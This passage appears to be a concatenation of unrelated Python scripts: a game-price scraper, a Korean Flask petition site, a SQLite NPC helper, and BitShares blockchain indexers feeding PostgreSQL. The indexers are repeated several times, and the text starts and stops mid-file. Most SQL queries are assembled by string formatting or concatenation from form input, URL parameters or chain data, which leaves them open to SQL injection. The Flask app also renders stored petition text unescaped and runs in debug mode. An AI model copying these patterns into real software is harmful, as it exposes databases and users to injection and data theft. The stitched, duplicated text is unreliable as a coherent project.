                      'date': date,
                      'price': (cleanStr(prices[i].text, False)),
                      'price_discounted': (cleanStr(prices[i].text, True)),
                      'id_num': cleanID(links[i], False),
                      'id_title': cleanID(links[i], True),
                      'type': links[i].get('href').split('/')[3]})

for i in range(0, 1000):
    print(
        games[i]['rank'],
        games[i]['title'],
        games[i]['release'],
        games[i]['date'],
        games[i]['price'],
        games[i]['price_discounted'],
        games[i]['id_num'],
        games[i]['id_title'],
        games[i]['type'])

# db connection
connect = odbc.odbc('oasis')
db = connect.cursor()
sql = '''
    INSERT INTO oasis.games(title, ranking, price, price_discounted, date, release_date, type, id_title, id_num) VALUES ("%s","%d","%d","%d","%s","%s","%s","%s","%s")
    '''
for i in range(0, 1000):
    db.execute(sql % (
        games[i]['title'], games[i]['rank'], games[i]['price'], games[i]['price_discounted'], games[i]['date'],
        games[i]['release'], games[i]['type'], games[i]['id_title'], games[i]['id_num']))

# check db
Checker.check('games')

## Import Python Modules ##
from flask import Flask, render_template, request, jsonify, redirect
from flask_assets import Bundle, Environment
from flask_login import LoginManager
from flask_login import login_user, logout_user, current_user, login_required
from datetime import datetime
import sqlite3
import re
import json
import libgravatar
import sys
import asyncio

import LocalSettings

app = Flask(__name__)

try:
    FLASK_PORT_SET = int(sys.argv[1])
    print(' * Í∞ïÏ†ú Ìè¨Ìä∏ ÏÑ§Ï†ï ÏßÄÏ†ïÎê®.')
except:
    FLASK_PORT_SET = LocalSettings.FLASK_HOST_PORT


## DATABASE CONNECTION ##
conn = sqlite3.connect(LocalSettings.SQLITE3_FILENAME, check_same_thread = False)
curs = conn.cursor()


## DATABASE TABLES CREATE ##
try:
    curs.execute('select * from FORM_DATA_TB limit 1')
except:
    DATABASE_QUERY = open('tables/initial.sql').read()
    curs.executescript(DATABASE_QUERY)
    conn.commit


## LOAD CONVERSTATIONS ##
CONVERSTATIONS_NATIVE = open('dic.json', encoding='utf-8').read()
CONVERSTATIONS_DICT = json.loads(CONVERSTATIONS_NATIVE)

## Assets Bundling ##
bundles = {
    'main_js' : Bundle(
        'js/bootstrap.min.js',
        output = 'gen/main.js'
    ),

    'main_css' : Bundle(
        'css/minty.css',
        'css/custom.css',
        output = 'gen/main.css'
    )
}

assets = Environment(app)
assets.register(bundles)


## Flask Route ##
@app.route('/', methods=['GET', 'POST'])
def main():
    BODY_CONTENT = ''
    BODY_CONTENT += open('templates/index_content.html', encoding='utf-8').read()
    BODY_CONTENT = BODY_CONTENT.replace('| version |', LocalSettings.OFORM_RELEASE)
    curs.execute('select * from FORM_DATA_TB')
    form_data = curs.fetchall()
    for i in range(len(form_data)):
        pass
    return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)

## ================================================================================
@app.route('/peti/')
def petitions():
    BODY_CONTENT = ''
    curs.execute('select * from PETITION_DATA_TB')
    result = curs.fetchall()
    BODY_CONTENT += '<h1>ÏÉàÎ°úÏö¥ Ï≤≠ÏõêÎì§</h1><table class="table table-hover"><thead><tr><th scope="col">N</th><th scope="col">Column heading</th></tr></thead><tbody>'
    for i in range(len(result)):
        BODY_CONTENT += '<tr><th scope="row">{}</th><td><a href="/peti/a/{}">{}</a></td></tr>'.format(result[i][0], result[i][0], result[i][1])
    BODY_CONTENT += '</tbody></table>'
    BODY_CONTENT += '<button onclick="window.location.href=\'write\'" class="btn btn-primary" value="publish">Ï≤≠Ïõê Îì±Î°ù</button>'
    return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)

@app.route('/peti/a/<form_id>/')
def peti_a(form_id):
    if form_id == '':
        return 404
    BODY_CONTENT = ''
    print(form_id)
    try:
        curs.execute('select * from PETITION_DATA_TB where form_id = {}'.format(form_id))
        result = curs.fetchall()
    except:
        return 404
    form_display_name = result[0][1]
    form_publish_date = result[0][2]
    form_author = result[0][4]
    form_body_content = result[0][5]
    BODY_CONTENT += open('templates/peti_viewer.html').read()
    
    BODY_CONTENT = BODY_CONTENT.replace(' form_display_name ', form_display_name)
    BODY_CONTENT = BODY_CONTENT.replace(' form_publish_date ', form_publish_date)
    BODY_CONTENT = BODY_CONTENT.replace(' form_author ', form_author)
    BODY_CONTENT = BODY_CONTENT.replace(' form_body_content ', form_body_content)
    return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)


@app.route('/peti/write/', methods=['GET', 'POST'])
def petitions_write():
    BODY_CONTENT = ''
    if request.method == 'POST':
        form_display_name = request.form['form_display_name']                    
        form_author_name = request.form['form_author_name']                    
        form_body_content = request.form['form_body_content']                    
        form_body_content = form_body_content.replace('"', '\\"')                    
        form_enabled = 1
        form_author = form_author_name
        form_publish_date = datetime.today()
        curs.execute('insert into PETITION_DATA_TB (form_display_name, form_publish_date, form_enabled, form_author, form_body_content) values("{}", "{}", {}, "{}", "{}")'.format(
            form_display_name, 
            form_publish_date, 
            form_enabled, 
            form_author, 
            form_body_content)
            )
        conn.commit()
        return redirect('/peti')
    else:
        BODY_CONTENT += open('templates/petitions.html', encoding='utf-8').read()
        return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)

## ================================================================================
@app.route('/articles/', methods=['GET', 'POST'])
def articles():
    return 0

@app.route('/articles/write/', methods=['GET', 'POST'])
def articles_write():
    BODY_CONTENT = ''
    if request.method == 'POST':
        form_display_name = request.form['form_display_name']                    
        form_notice_level = request.form['form_notice_level']
        form_body_content = request.form['form_body_content']                    
        if request.form['submit'] == 'publish':
            form_enabled = 1
        elif request.form['submit'] == 'preview':
            form_enabled = 0
        form_publish_date = datetime.today()
        curs.execute('insert into FORM_DATA_TB (form_display_name, form_notice_level, form_publish_date, form_enabled, form_body_content) values("{}", "{}", "{}", {}, "{}")'.format(form_display_name, form_notice_level, form_publish_date, form_enabled, form_body_content))
    else:
        BODY_CONTENT += CONVERSTATIONS_DICT['articles_write']
        return render_template('index.html', OFORM_APPNAME = LocalSettings.OFORM_APPNAME, OFORM_CONTENT = BODY_CONTENT)

while(1):
    app.run(LocalSettings.FLASK_HOST, FLASK_PORT_SET, debug = True)

import sqlite3
from time import gmtime, strftime
import os.path

DATABASE_NAME = 'assets/temp.sqlite'

def now():
	return strftime("%Y-%m-%d %H:%M:%S", gmtime())

def getConnection():
	conn = sqlite3.connect(DATABASE_NAME)
	c = conn.cursor()
	return c, conn

def createDatabase():
	c, conn = getConnection()
	c.execute('''CREATE TABLE if not exists npc
				 (date text, user text, race text, class text, sex text, level INTEGER, image text, legit INTEGER)''')
	c.execute('''CREATE TABLE if not exists usage
				 (id INTEGER PRIMARY KEY AUTOINCREMENT, date text, user text, command text)''')
	conn.commit()
	conn.close()

def insertNPC(name, race,classe,sex,level,image,legit):
	c, conn = getConnection()
	date = now()
	c.execute("INSERT INTO npc VALUES ('"+date+"','"+str(name)+"','"+race+"','"+classe+"','"+sex+"','"+str(level)+"','"+image+"','"+str(legit)+"')")                    
	conn.commit()
	conn.close()

def findNPC(race, classe, sex,level):
	c, conn = getConnection()
	date = now()
	#select image, SUM(legit) as l FROM npc WHERE race='Elf' AND class='Bard' AND sex='Male' GROUP BY image HAVING l>5 ORDER BY SUM(legit) DESC;
	c.execute("select image, avg(legit) as l FROM npc WHERE race='"+race+"' AND class='"+classe+"' AND sex='"+sex+"' GROUP BY image HAVING l > 5 ORDER BY SUM(legit) DESC;")
	conn.commit()
	out = c.fetchmany(5)
	conn.close()
	return out

def insertUsage(user, command):
	c, conn = getConnection()
	date = now()
	c.execute("INSERT INTO usage (date,user,command) VALUES ('"+date+"','"+str(user)+"','"+command+"')")                    
	conn.commit()
	conn.close()

#c, conn = getConnection()
#createDatabase(c,conn)
#insertNPC(c,conn,"pino","Mage","elf",6,"mafiwfiwan.png",10)
#insertUsage(c,conn,"Ugo","/png")

#conn.commit()

#


#!/usr/bin/env python2
import json
import os
import time
import urllib

import psycopg2
from websocket import create_connection

import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()

query = "TRUNCATE holders"
cur.execute(query)                    
query = "ALTER SEQUENCE holders_hid_seq RESTART WITH 1"
cur.execute(query)                    
con.commit()

ws.send('{"id":1, "method":"call", "params":[0,"get_account_count",[]]}')
result = ws.recv()
j = json.loads(result)
account_count = int(j["result"])

for ac in range(0, account_count):

    ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["1.2.' + str(ac) + '"]]]}')
    result = ws.recv()
    j = json.loads(result)

    try:
        account_id = j["result"][0]["id"]
        account_name = j["result"][0]["name"]
    except:
        continue


    ws.send('{"id":1, "method":"call", "params":[0,"get_account_balances",["' + account_id + '", ["1.3.0"]]]}')
    result3 = ws.recv()
    jb = json.loads(result3)

    if jb["result"][0]["amount"] == 0:
        continue
    else:
        amount = jb["result"][0]["amount"]

        # add total_core_in_orders to the sum
        ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["' + j["result"][0]["statistics"] + '"]]]}')
        result = ws.recv()
        js = json.loads(result)

        try:
            total_core_in_orders = js["result"][0]["total_core_in_orders"]
        except:
            total_core_in_orders = 0

        amount = int(amount) + int(total_core_in_orders)

        voting_account = j["result"][0]["options"]["voting_account"]
        query = "INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('"+account_id+"', '"+account_name+"','"+str(amount)+"', '"+voting_account+"')"                    
        cur.execute(query)                    
        con.commit()

con.close()

#!/usr/bin/env python2
import json

import psycopg2
from websocket import create_connection

import api
import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()

query = "TRUNCATE markets"
cur.execute(query)                    

query = "ALTER SEQUENCE markets_id_seq RESTART WITH 1"
cur.execute(query)                    

con.commit()

query = "SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC"
cur.execute(query)                    
rows = cur.fetchall()

for row in rows:
    all_assets = []

    ws.send('{"id":1, "method":"call", "params":[0,"list_assets",["AAAAA", 100]]}')
    result = ws.recv()
    j = json.loads(result)

    all_assets.append(j);

    len_result = len(j["result"])

    while len_result == 100:
        ws.send('{"id":1, "method":"call", "params":[0,"list_assets",["'+j["result"][99]["symbol"]+'", 100]]}')
        result = ws.recv()
        j = json.loads(result)
        len_result = len(j["result"])
        all_assets.append(j);

    try:
        for x in range (0, len(all_assets)):
            for i in range(0, 100):

                symbol =  all_assets[x]["result"][i]["symbol"]
                id_ = all_assets[x]["result"][i]["id"]

                try:
                    data = api._get_volume(symbol, row[1])
                    volume = data["base_volume"]
                except:
                    volume = 0
                    continue

                try:
                    data2 = api._get_ticker(symbol, row[1])
                    price = data2["latest"]
                    #print price
                except:
                    price = 0
                    continue

                print row[1] + " / " + symbol + " vol: " + str(volume) + " price: " + str(price)
                #if symbol == "COMPUCEEDS":
                #    exit

                # this was an attempt to sum up volume of not bts crosses to calculate total DEX volume, disabled by now(need better math to convert to bts)
                """
                if float(data["base_volume"]) > 0 and float(row[3]) > 0 and row[1] != "BTS" and symbol != "BTS":
                    ws.send('{"id":1, "method":"call", "params":[0,"lookup_asset_symbols",[["' + symbol + '"], 0]]}')
                    result_l = ws.recv()
                    j_l = json.loads(result_l)
                    base_id = j_l["result"][0]["id"]
                    base_precision = 10 ** float(j_l["result"][0]["precision"])
                    # print base_id

                    ws.send('{"id":1, "method":"call", "params":[0,"lookup_asset_symbols",[["' + row[1] + '"], 0]]}')
                    result_l = ws.recv()
                    j_l = json.loads(result_l)
                    # print j_l
                    quote_id = j_l["result"][0]["id"]
                    quote_precision = 10 ** float(j_l["result"][0]["precision"])

                    print float(row[4])
                    print float(data['base_volume'])
                    print float(row[3])
                    sum_volume = float(row[4]) + (float(data['base_volume']) * float(base_precision) / float(data['quote_volume']) * float(quote_precision)) / float(row[3])
                    print sum_volume
                    exit
                    query_u = "UPDATE assets SET volume='"+str(sum_volume)+"' WHERE id="+str(row[0])
                    #print query_u
                    cur.execute(query_u)
                    con.commit()
                """

                if float(price) > 0 and float(volume) > 0:
                    query = "INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('"+row[1]+ "/" + symbol+"', '"+str(row[0])+"', '"+str(float(price))+"', '"+str(float(volume))+"', '"+row[2]+"')"                    
                    print query
                    cur.execute(query)                    
                    con.commit()

    except:
        continue


cur.close()
con.close()

#!/usr/bin/env python2
import json
import thread

import psycopg2
import websocket

import api
import config


def on_message(ws, message):
    #print(message)
    j = json.loads(message)
    try:
        #print j["params"][1][0][0]["id"]
        id_ = j["params"][1][0][0]["id"]
        #print id_[:4]
        if id_[:4] == "2.9.":
            #print j["params"][1][0][0]
            data = api._get_object(id_)
            #print data[0]
            account_id = data[0]["account"]
            data_a = api._account_name(account_id)

            #print data_a[0]["name"]
            account_name = data_a[0]["name"]

            data2 = api._get_object(data[0]['operation_id'])
            block_num = data2[0]["block_num"]

            op_type = data2[0]["op"][0]

            #print block_num
            trx_in_block =  data2[0]["trx_in_block"]
            op_in_trx =  data2[0]["op_in_trx"]

            con = psycopg2.connect(**config.POSTGRES)
            cur = con.cursor()
            query = "INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('"+id_+"', '"+data[0]["operation_id"]+"', '"+str(block_num)+"', '"+str(trx_in_block)+"', '"+str(op_in_trx)+"', NOW(), '"+account_id+"', '"+str(op_type)+"', '"+account_name+"')"                    
            print query
            cur.execute(query)                    
            con.commit()

    except:
        pass


def on_error(ws, error):
    print(error)
    #print ""


def on_close(ws):
    print("### closed ###")


def on_open(ws):
    def run(*args):
        ws.send('{"method": "call", "params": [1, "database", []], "id": 3}')
        ws.send('{"method": "call", "params": [2, "set_subscribe_callback", [5, true]], "id": 6}')

    thread.start_new_thread(run, ())


if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(config.WEBSOCKET_URL,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.on_open = on_open

    ws.run_forever()

#!/usr/bin/env python2
import json
import os
import time
import urllib

import psycopg2
from websocket import create_connection

import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()


#query = "TRUNCATE referrers"
#cur.execute(query)                    
#query = "ALTER SEQUENCE referrers_rid_seq RESTART WITH 1"
#cur.execute(query)                    
#con.commit()

query = "SELECT rid FROM referrers ORDER BY rid DESC LIMIT 1"
cur.execute(query)                    
in_database = cur.fetchone() or [0]

ws.send('{"id":1, "method":"call", "params":[0,"get_account_count",[]]}')
result = ws.recv()
j = json.loads(result)
account_count = int(j["result"])

print account_count

for ac in range(in_database[0], account_count):

    ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["1.2.' + str(ac) + '"]]]}')
    result = ws.recv()
    j = json.loads(result)

    try:
        account_id = j["result"][0]["id"]
        account_name = j["result"][0]["name"]

        referrer = j["result"][0]["referrer"]
        referrer_rewards_percentage = j["result"][0]["referrer_rewards_percentage"]
        lifetime_referrer = j["result"][0]["lifetime_referrer"]
        lifetime_referrer_fee_percentage = j["result"][0]["lifetime_referrer_fee_percentage"]

        print account_id
        print referrer
        print lifetime_referrer
        print ""

        query = "INSERT INTO referrers (account_id, account_name, referrer, referrer_rewards_percentage, lifetime_referrer, lifetime_referrer_fee_percentage) " \
                "VALUES('"+account_id+"', '"+account_name+"','"+referrer+"', '"+str(referrer_rewards_percentage)+"','"+lifetime_referrer+"', '"+str(lifetime_referrer_fee_percentage)+"')"                    
        cur.execute(query)                    
        con.commit()

    except:
        continue

con.close()



#!/usr/bin/env python2
import json
import os
import time
import urllib

import psycopg2
from websocket import create_connection

import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()

query = "TRUNCATE holders"
cur.execute(query)                    
query = "ALTER SEQUENCE holders_hid_seq RESTART WITH 1"
cur.execute(query)                    
con.commit()

ws.send('{"id":1, "method":"call", "params":[0,"get_account_count",[]]}')
result = ws.recv()
j = json.loads(result)
account_count = int(j["result"])

for ac in range(0, account_count):

    ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["1.2.' + str(ac) + '"]]]}')
    result = ws.recv()
    j = json.loads(result)

    try:
        account_id = j["result"][0]["id"]
        account_name = j["result"][0]["name"]
    except:
        continue


    ws.send('{"id":1, "method":"call", "params":[0,"get_account_balances",["' + account_id + '", ["1.3.0"]]]}')
    result3 = ws.recv()
    jb = json.loads(result3)

    if jb["result"][0]["amount"] == 0:
        continue
    else:
        amount = jb["result"][0]["amount"]

        # add total_core_in_orders to the sum
        ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["' + j["result"][0]["statistics"] + '"]]]}')
        result = ws.recv()
        js = json.loads(result)

        try:
            total_core_in_orders = js["result"][0]["total_core_in_orders"]
        except:
            total_core_in_orders = 0

        amount = int(amount) + int(total_core_in_orders)

        voting_account = j["result"][0]["options"]["voting_account"]
        query = "INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('"+account_id+"', '"+account_name+"','"+str(amount)+"', '"+voting_account+"')"                    
        cur.execute(query)                    
        con.commit()

con.close()

#!/usr/bin/env python2
import json

import psycopg2
from websocket import create_connection

import api
import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()

query = "TRUNCATE markets"
cur.execute(query)                    

query = "ALTER SEQUENCE markets_id_seq RESTART WITH 1"
cur.execute(query)                    

con.commit()

query = "SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC"
cur.execute(query)                    
rows = cur.fetchall()

for row in rows:
    all_assets = []

    ws.send('{"id":1, "method":"call", "params":[0,"list_assets",["AAAAA", 100]]}')
    result = ws.recv()
    j = json.loads(result)

    all_assets.append(j);

    len_result = len(j["result"])

    while len_result == 100:
        ws.send('{"id":1, "method":"call", "params":[0,"list_assets",["'+j["result"][99]["symbol"]+'", 100]]}')
        result = ws.recv()
        j = json.loads(result)
        len_result = len(j["result"])
        all_assets.append(j);

    try:
        for x in range (0, len(all_assets)):
            for i in range(0, 100):

                symbol =  all_assets[x]["result"][i]["symbol"]
                id_ = all_assets[x]["result"][i]["id"]

                try:
                    data = api._get_volume(symbol, row[1])
                    volume = data["base_volume"]
                except:
                    volume = 0
                    continue

                try:
                    data2 = api._get_ticker(symbol, row[1])
                    price = data2["latest"]
                    #print price
                except:
                    price = 0
                    continue

                print row[1] + " / " + symbol + " vol: " + str(volume) + " price: " + str(price)
                #if symbol == "COMPUCEEDS":
                #    exit

                # this was an attempt to sum up volume of not bts crosses to calculate total DEX volume, disabled by now(need better math to convert to bts)
                """
                if float(data["base_volume"]) > 0 and float(row[3]) > 0 and row[1] != "BTS" and symbol != "BTS":
                    ws.send('{"id":1, "method":"call", "params":[0,"lookup_asset_symbols",[["' + symbol + '"], 0]]}')
                    result_l = ws.recv()
                    j_l = json.loads(result_l)
                    base_id = j_l["result"][0]["id"]
                    base_precision = 10 ** float(j_l["result"][0]["precision"])
                    # print base_id

                    ws.send('{"id":1, "method":"call", "params":[0,"lookup_asset_symbols",[["' + row[1] + '"], 0]]}')
                    result_l = ws.recv()
                    j_l = json.loads(result_l)
                    # print j_l
                    quote_id = j_l["result"][0]["id"]
                    quote_precision = 10 ** float(j_l["result"][0]["precision"])

                    print float(row[4])
                    print float(data['base_volume'])
                    print float(row[3])
                    sum_volume = float(row[4]) + (float(data['base_volume']) * float(base_precision) / float(data['quote_volume']) * float(quote_precision)) / float(row[3])
                    print sum_volume
                    exit
                    query_u = "UPDATE assets SET volume='"+str(sum_volume)+"' WHERE id="+str(row[0])
                    #print query_u
                    cur.execute(query_u)
                    con.commit()
                """

                if float(price) > 0 and float(volume) > 0:
                    query = "INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('"+row[1]+ "/" + symbol+"', '"+str(row[0])+"', '"+str(float(price))+"', '"+str(float(volume))+"', '"+row[2]+"')"                    
                    print query
                    cur.execute(query)                    
                    con.commit()

    except:
        continue


cur.close()
con.close()

#!/usr/bin/env python2
import json
import thread

import psycopg2
import websocket

import api
import config


def on_message(ws, message):
    #print(message)
    j = json.loads(message)
    try:
        #print j["params"][1][0][0]["id"]
        id_ = j["params"][1][0][0]["id"]
        #print id_[:4]
        if id_[:4] == "2.9.":
            #print j["params"][1][0][0]
            data = api._get_object(id_)
            #print data[0]
            account_id = data[0]["account"]
            data_a = api._account_name(account_id)

            #print data_a[0]["name"]
            account_name = data_a[0]["name"]

            data2 = api._get_object(data[0]['operation_id'])
            block_num = data2[0]["block_num"]

            op_type = data2[0]["op"][0]

            #print block_num
            trx_in_block =  data2[0]["trx_in_block"]
            op_in_trx =  data2[0]["op_in_trx"]

            con = psycopg2.connect(**config.POSTGRES)
            cur = con.cursor()
            query = "INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('"+id_+"', '"+data[0]["operation_id"]+"', '"+str(block_num)+"', '"+str(trx_in_block)+"', '"+str(op_in_trx)+"', NOW(), '"+account_id+"', '"+str(op_type)+"', '"+account_name+"')"                    
            print query
            cur.execute(query)                    
            con.commit()

    except:
        pass


def on_error(ws, error):
    print(error)
    #print ""


def on_close(ws):
    print("### closed ###")


def on_open(ws):
    def run(*args):
        ws.send('{"method": "call", "params": [1, "database", []], "id": 3}')
        ws.send('{"method": "call", "params": [2, "set_subscribe_callback", [5, true]], "id": 6}')

    thread.start_new_thread(run, ())


if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(config.WEBSOCKET_URL,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.on_open = on_open

    ws.run_forever()

#!/usr/bin/env python2
import json
import os
import time
import urllib

import psycopg2
from websocket import create_connection

import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()


#query = "TRUNCATE referrers"
#cur.execute(query)                    
#query = "ALTER SEQUENCE referrers_rid_seq RESTART WITH 1"
#cur.execute(query)                    
#con.commit()

query = "SELECT rid FROM referrers ORDER BY rid DESC LIMIT 1"
cur.execute(query)                    
in_database = cur.fetchone() or [0]

ws.send('{"id":1, "method":"call", "params":[0,"get_account_count",[]]}')
result = ws.recv()
j = json.loads(result)
account_count = int(j["result"])

print account_count

for ac in range(in_database[0], account_count):

    ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["1.2.' + str(ac) + '"]]]}')
    result = ws.recv()
    j = json.loads(result)

    try:
        account_id = j["result"][0]["id"]
        account_name = j["result"][0]["name"]

        referrer = j["result"][0]["referrer"]
        referrer_rewards_percentage = j["result"][0]["referrer_rewards_percentage"]
        lifetime_referrer = j["result"][0]["lifetime_referrer"]
        lifetime_referrer_fee_percentage = j["result"][0]["lifetime_referrer_fee_percentage"]

        print account_id
        print referrer
        print lifetime_referrer
        print ""

        query = "INSERT INTO referrers (account_id, account_name, referrer, referrer_rewards_percentage, lifetime_referrer, lifetime_referrer_fee_percentage) " \
                "VALUES('"+account_id+"', '"+account_name+"','"+referrer+"', '"+str(referrer_rewards_percentage)+"','"+lifetime_referrer+"', '"+str(lifetime_referrer_fee_percentage)+"')"                    
        cur.execute(query)                    
        con.commit()

    except:
        continue

con.close()


#!/usr/bin/env python2
import json
import os
import time
import urllib

import psycopg2
from websocket import create_connection

import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()

query = "TRUNCATE holders"
cur.execute(query)                    
query = "ALTER SEQUENCE holders_hid_seq RESTART WITH 1"
cur.execute(query)                    
con.commit()

ws.send('{"id":1, "method":"call", "params":[0,"get_account_count",[]]}')
result = ws.recv()
j = json.loads(result)
account_count = int(j["result"])

for ac in range(0, account_count):

    ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["1.2.' + str(ac) + '"]]]}')
    result = ws.recv()
    j = json.loads(result)

    try:
        account_id = j["result"][0]["id"]
        account_name = j["result"][0]["name"]
    except:
        continue


    ws.send('{"id":1, "method":"call", "params":[0,"get_account_balances",["' + account_id + '", ["1.3.0"]]]}')
    result3 = ws.recv()
    jb = json.loads(result3)

    if jb["result"][0]["amount"] == 0:
        continue
    else:
        amount = jb["result"][0]["amount"]

        # add total_core_in_orders to the sum
        ws.send('{"id":1, "method":"call", "params":[0,"get_objects",[["' + j["result"][0]["statistics"] + '"]]]}')
        result = ws.recv()
        js = json.loads(result)

        try:
            total_core_in_orders = js["result"][0]["total_core_in_orders"]
        except:
            total_core_in_orders = 0

        amount = int(amount) + int(total_core_in_orders)

        voting_account = j["result"][0]["options"]["voting_account"]
        query = "INSERT INTO holders (account_id, account_name, amount, voting_as) VALUES('"+account_id+"', '"+account_name+"','"+str(amount)+"', '"+voting_account+"')"                    
        cur.execute(query)                    
        con.commit()

con.close()

#!/usr/bin/env python2
import json

import psycopg2
from websocket import create_connection

import api
import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()

query = "TRUNCATE markets"
cur.execute(query)                    

query = "ALTER SEQUENCE markets_id_seq RESTART WITH 1"
cur.execute(query)                    

con.commit()

query = "SELECT * FROM assets WHERE volume > 0 ORDER BY volume DESC"
cur.execute(query)                    
rows = cur.fetchall()

for row in rows:
    all_assets = []

    ws.send('{"id":1, "method":"call", "params":[0,"list_assets",["AAAAA", 100]]}')
    result = ws.recv()
    j = json.loads(result)

    all_assets.append(j);

    len_result = len(j["result"])

    while len_result == 100:
        ws.send('{"id":1, "method":"call", "params":[0,"list_assets",["'+j["result"][99]["symbol"]+'", 100]]}')
        result = ws.recv()
        j = json.loads(result)
        len_result = len(j["result"])
        all_assets.append(j);

    try:
        for x in range (0, len(all_assets)):
            for i in range(0, 100):

                symbol =  all_assets[x]["result"][i]["symbol"]
                id_ = all_assets[x]["result"][i]["id"]

                try:
                    data = api._get_volume(symbol, row[1])
                    volume = data["base_volume"]
                except:
                    volume = 0
                    continue

                try:
                    data2 = api._get_ticker(symbol, row[1])
                    price = data2["latest"]
                    #print price
                except:
                    price = 0
                    continue

                print row[1] + " / " + symbol + " vol: " + str(volume) + " price: " + str(price)
                #if symbol == "COMPUCEEDS":
                #    exit

                # this was an attempt to sum up volume of not bts crosses to calculate total DEX volume, disabled by now(need better math to convert to bts)
                """
                if float(data["base_volume"]) > 0 and float(row[3]) > 0 and row[1] != "BTS" and symbol != "BTS":
                    ws.send('{"id":1, "method":"call", "params":[0,"lookup_asset_symbols",[["' + symbol + '"], 0]]}')
                    result_l = ws.recv()
                    j_l = json.loads(result_l)
                    base_id = j_l["result"][0]["id"]
                    base_precision = 10 ** float(j_l["result"][0]["precision"])
                    # print base_id

                    ws.send('{"id":1, "method":"call", "params":[0,"lookup_asset_symbols",[["' + row[1] + '"], 0]]}')
                    result_l = ws.recv()
                    j_l = json.loads(result_l)
                    # print j_l
                    quote_id = j_l["result"][0]["id"]
                    quote_precision = 10 ** float(j_l["result"][0]["precision"])

                    print float(row[4])
                    print float(data['base_volume'])
                    print float(row[3])
                    sum_volume = float(row[4]) + (float(data['base_volume']) * float(base_precision) / float(data['quote_volume']) * float(quote_precision)) / float(row[3])
                    print sum_volume
                    exit
                    query_u = "UPDATE assets SET volume='"+str(sum_volume)+"' WHERE id="+str(row[0])
                    #print query_u
                    cur.execute(query_u)
                    con.commit()
                """

                if float(price) > 0 and float(volume) > 0:
                    query = "INSERT INTO markets (pair, asset_id, price, volume, aid) VALUES('"+row[1]+ "/" + symbol+"', '"+str(row[0])+"', '"+str(float(price))+"', '"+str(float(volume))+"', '"+row[2]+"')"                    
                    print query
                    cur.execute(query)                    
                    con.commit()

    except:
        continue


cur.close()
con.close()

#!/usr/bin/env python2
import json
import thread

import psycopg2
import websocket

import api
import config


def on_message(ws, message):
    #print(message)
    j = json.loads(message)
    try:
        #print j["params"][1][0][0]["id"]
        id_ = j["params"][1][0][0]["id"]
        #print id_[:4]
        if id_[:4] == "2.9.":
            #print j["params"][1][0][0]
            data = api._get_object(id_)
            #print data[0]
            account_id = data[0]["account"]
            data_a = api._account_name(account_id)

            #print data_a[0]["name"]
            account_name = data_a[0]["name"]

            data2 = api._get_object(data[0]['operation_id'])
            block_num = data2[0]["block_num"]

            op_type = data2[0]["op"][0]

            #print block_num
            trx_in_block =  data2[0]["trx_in_block"]
            op_in_trx =  data2[0]["op_in_trx"]

            con = psycopg2.connect(**config.POSTGRES)
            cur = con.cursor()
            query = "INSERT INTO ops (oh, ath, block_num, trx_in_block, op_in_trx, datetime, account_id, op_type, account_name) VALUES('"+id_+"', '"+data[0]["operation_id"]+"', '"+str(block_num)+"', '"+str(trx_in_block)+"', '"+str(op_in_trx)+"', NOW(), '"+account_id+"', '"+str(op_type)+"', '"+account_name+"')"                    
            print query
            cur.execute(query)                    
            con.commit()

    except:
        pass


def on_error(ws, error):
    print(error)
    #print ""


def on_close(ws):
    print("### closed ###")


def on_open(ws):
    def run(*args):
        ws.send('{"method": "call", "params": [1, "database", []], "id": 3}')
        ws.send('{"method": "call", "params": [2, "set_subscribe_callback", [5, true]], "id": 6}')

    thread.start_new_thread(run, ())


if __name__ == "__main__":
    websocket.enableTrace(True)
    ws = websocket.WebSocketApp(config.WEBSOCKET_URL,
                                on_message=on_message,
                                on_error=on_error,
                                on_close=on_close)
    ws.on_open = on_open

    ws.run_forever()

#!/usr/bin/env python2
import json
import os
import time
import urllib

import psycopg2
from websocket import create_connection

import config


ws = create_connection(config.WEBSOCKET_URL)

con = psycopg2.connect(**config.POSTGRES)
cur = con.cursor()


#query = "TRUNCATE referrers"
#cur.execute(query)                    
#query = "ALTER SEQUENCE referrers_rid_seq RESTART WITH 1"
